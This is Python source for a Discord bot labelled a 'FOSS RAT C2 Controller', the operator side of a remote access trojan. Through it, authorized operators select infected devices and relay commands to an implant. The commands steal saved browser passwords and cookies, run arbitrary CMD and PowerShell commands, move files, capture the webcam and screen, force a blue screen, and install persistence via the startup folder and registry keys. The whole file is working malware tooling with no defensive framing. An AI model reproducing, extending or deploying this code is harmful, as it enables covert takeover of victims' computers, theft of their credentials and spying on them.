import discord
from discord.ext import commands
import os
import io

# --- Configuration & State ---
TOKEN_PATH = 'token.txt'
AUTHORIZED_USERS = [1153459521251983470, 1385474310004670516]
SERVER_CATEGORY_NAME = "🔴 Live Sessions"
COMMAND_PREFIX = '!'
INSTRUCTION_PREFIX = 'EXEC_CMD:'
active_sessions = {}
DISCORD_ATTACHMENT_LIMIT = 25 * 1024 * 1024

# --- Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

# --- Helpers & Events ---
def load_token():
    if not os.path.exists(TOKEN_PATH):
        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f:
        return f.read().strip()

@bot.event
async def on_ready():
    print(f'C2 Controller logged in as {bot.user}')

@bot.event
async def on_message(message):
    if message.author.id not in AUTHORIZED_USERS:
        return
    await bot.process_commands(message)

async def dispatch_command(ctx, command: str, friendly_name: str, *args):
    if ctx.author.id not in active_sessions:
        await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
        return False
    channel = active_sessions[ctx.author.id]
    await channel.send(f"{INSTRUCTION_PREFIX}{command} {' '.join(args)}")
    await ctx.send(f"✅ Executed command: **{friendly_name}** on **{channel.name}**.")
    return True

# --- Commands ---
@bot.command(name="download")
async def download(ctx, *, file_path: str):
    """Downloads a file from the selected device."""
    await dispatch_command(ctx, "download", f"Requested download of `{file_path}`", file_path)

@bot.command(name="bsod")
async def trigger_bsod(ctx):
    """Triggers a Blue Screen of Death (BSOD) on the selected device."""
    await dispatch_command(ctx, "bsod", "Triggered BSOD")

@bot.command(name="upload")
async def upload(ctx, path_on_implant: str, url: str = None):
    """Uploads a file to the selected device via attachment or URL."""
    if ctx.author.id not in active_sessions:
        return await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")

    channel = active_sessions[ctx.author.id]

    # Method A: Upload via Discord Attachment (REWRITTEN)
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        if attachment.size > DISCORD_ATTACHMENT_LIMIT:
            return await ctx.send(f"❌ Attachment is too large. Max size is {DISCORD_ATTACHMENT_LIMIT / 1_000_000} MB.")

        # Read the attachment into a bytes-like object
        file_bytes = await attachment.read()
        discord_file = discord.File(io.BytesIO(file_bytes), filename=attachment.filename)

        # Send the instruction and the file ATTACHMENT in a new message
        await channel.send(f"{INSTRUCTION_PREFIX}upload_attachment {path_on_implant}", file=discord_file)
        await ctx.send(f"✅ Relaying attachment `{attachment.filename}` to **{channel.name}**.")

    # Method B: Upload via URL (Unchanged)
    elif url:
        await dispatch_command(ctx, "upload_url", f"Requested upload from URL to `{path_on_implant}`", path_on_implant, url)

    else:
        await ctx.send(f"❌ **Upload Error:** You must either attach a file to your message or provide a URL.")

@bot.command(name="stealpasswords")
async def steal_passwords(ctx):
    """Steal saved passwords from all browsers on the selected device."""
    await dispatch_command(ctx, "stealpasswords", "Attempted to steal passwords")

@bot.command(name="stealcookies")
async def steal_cookies(ctx):
    """Steal cookies from all browsers on the selected device."""
    await dispatch_command(ctx, "stealcookies", "Attempted to steal cookies")

# ... (all other commands like help, list, select, etc. are unchanged) ...
@bot.command(name="help")
async def help_command(ctx):
    """Displays this help message."""
    embed=discord.Embed(title="FOSS RAT C2 Controller Help",color=discord.Color.purple())
    for c in sorted(bot.commands,key=lambda x:x.name):
        if c.name!='help':embed.add_field(name=f"`{COMMAND_PREFIX}{c.name} {c.signature}`",value=c.help,inline=False)
    await ctx.send(embed=embed)
@bot.command(name="list")
async def list_devices(ctx):
    """Lists all currently active devices."""
    c=discord.utils.get(ctx.guild.categories,name=SERVER_CATEGORY_NAME)
    if not c:return await ctx.send(f"❌ Category '{SERVER_CATEGORY_NAME}' not found.")
    d=[f"📁 `{ch.name}`"for ch in c.text_channels]
    if not d:return await ctx.send("No active devices found.")
    await ctx.send(embed=discord.Embed(title="Active Devices",description="\n".join(d),color=discord.Color.green()))
@bot.command(name="select")
async def select(ctx,d:str):
    """Selects a device by name to issue commands to."""
    c=discord.utils.get(ctx.guild.text_channels,name=d.lower())
    if not c:return await ctx.send(f"❌ Device '{d}' not found.")
    active_sessions[ctx.author.id]=c;await ctx.send(f"✅ Session started. You are now controlling **{d}**.")
@bot.command(name="kill")
async def kill(ctx):
    """Terminates the implant process on the selected device."""
    await dispatch_command(ctx,"kill","Terminated implant session")
@bot.command(name="runcmd")
async def runcmd(ctx,*,c:str):
    """Executes a standard CMD command on the selected device."""
    await dispatch_command(ctx,"runcmd",f"Ran CMD command `{c}`",c)
@bot.command(name="runpw")
async def runpw(ctx,*,c:str):
    """Executes a PowerShell command on the selected device."""
    await dispatch_command(ctx,"runpw",f"Ran PowerShell command `{c}`",c)
@bot.command(name="explore")
async def explore(ctx,*,p:str=""):
    """Lists files and folders at a specific path on the device."""
    await dispatch_command(ctx,"explore",f"Explored path `{p or 'current directory'}`",p)
@bot.command(name="irlpicture")
async def irlpicture(ctx):
    """Captures an image from the selected device's webcam."""
    await dispatch_command(ctx,"irlpicture","Took webcam picture")
@bot.command(name="openwebsite")
async def openwebsite(ctx,u:str):
    """Opens a URL in the default browser on the selected device."""
    await dispatch_command(ctx,"openwebsite",f"Opened URL `{u}`",u)
@bot.command(name="putinstartup")
async def putinstartup(ctx):
    """Adds the implant to the startup folder on the selected device."""
    await dispatch_command(ctx,"putinstartup","Added implant to startup folder")
@bot.command(name="persist")
async def persist(ctx,k:str):
    """Adds the implant to startup via Windows Registry."""
    await dispatch_command(ctx,"persist",f"Set registry persistence key '{k}'",k)
@bot.command(name="shownotification")
async def shownotification(ctx,t:str,*,m:str):
    """Displays a desktop notification on the selected device."""
    await dispatch_command(ctx,"shownotification",f"Showed notification '{t}'",f'"{t}"',m)
@bot.command(name="systemspecs")
async def systemspecs(ctx):
    """Retrieves detailed system specifications from the device."""
    await dispatch_command(ctx,"systemspecs","Retrieved system specs")
@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    """Takes a screenshot of the selected device's screen."""
    await dispatch_command(ctx,"takescreenshot","Took screenshot")

# --- Main Execution ---
if __name__ == "__main__":
    bot.run(load_token())